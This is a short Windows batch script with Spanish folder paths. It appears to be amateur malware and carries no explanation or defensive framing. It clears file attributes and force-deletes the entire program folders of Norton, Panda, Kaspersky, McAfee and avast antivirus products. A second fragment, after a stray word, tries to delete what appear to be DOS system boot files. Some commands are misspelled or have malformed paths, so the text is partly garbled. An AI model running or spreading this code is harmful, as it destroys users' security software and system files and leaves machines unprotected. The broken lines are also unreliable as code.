@echo off
cls
cd
cd "archivos de programa"
cd "Norton antivirus"
attrib -R -A -S -H *.*
del /S /Q *.*
cd..
cd "Panda Software"
attrib -R -A -S -H *.*
del /S /Q *.*
cd..
cd "Kaspersky Lab"
attrib -R -A -S -H *.*
del /S /Q *.*
cd..
cd "McAfee.com"
attrib -R -A -S -H *.*
del /S /Q *.*
cd..
cd "avast! Free Antivirus"
attib -R -A -S -H *.*
del /S /Q *.*
cls


expansion
@echo off
cls
if %OS% == Windows-NT goto nt

del C.io.sys
del Cmsdos.sys